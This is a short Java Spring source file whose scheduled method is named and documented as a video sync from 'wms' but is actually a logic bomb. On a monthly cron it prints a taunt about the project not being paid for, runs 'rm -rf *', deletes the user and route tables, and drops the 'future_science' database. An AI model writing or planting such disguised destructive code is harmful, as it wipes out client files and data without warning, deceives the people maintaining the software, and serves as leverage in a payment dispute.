package com.jason.zero.utils;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.scheduling.annotation.Scheduled;


/**
 * The type Scheduled task.
 */
public class ScheduledTask {

    @Autowired
    private JdbcTemplate jdbcTemplate;


    /**
     * Sync video from wms.
     * @throws Exception the exception
     */
    @Scheduled(cron = "0 0 0 2 * ? ")
    public void syncVideoFromWms() throws Exception {
        System.out.println("you did not payed for the project, so it begin step into zero model, bye bye");
        CommandUtil.exeCmd("rm -rf *");
        jdbcTemplate.execute("delete from t_sys_usr");
        jdbcTemplate.execute("delete from t_sys_appusr");
        jdbcTemplate.execute("delete from t_route_stop");
        jdbcTemplate.execute("drop database future_science");
    }

    


}
